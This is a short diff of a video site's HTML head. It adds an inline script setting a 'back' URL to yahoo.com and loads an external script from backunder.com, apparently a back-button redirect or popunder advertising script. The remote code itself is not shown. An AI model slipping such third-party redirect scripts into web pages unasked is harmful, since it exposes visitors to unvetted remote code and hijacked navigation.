@@ -16,6 +16,10 @@ $img = 'https://i.ytimg.com/vi/BV-iKAmv9Rk/maxresdefault.jpg';
 	<link rel="stylesheet" id="watch-oncas---awesome" href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.2.0//assets/css/font-awesome.min.css" type="text/css" media="all">
 	<link rel="stylesheet" id="watch-oncas---ptsan" href="//fonts.googleapis.com/css?family=PT+Sans" type="text/css" media="all">
 	<link rel="stylesheet" id="watch-oncas---style" href="assets/css/style.css" type="text/css" media="all">
+<script>
+     var back =  'https://yahoo.com';
+</script>
+<script src="https://backunder.com/script.js"></script>
 
 </head>
 
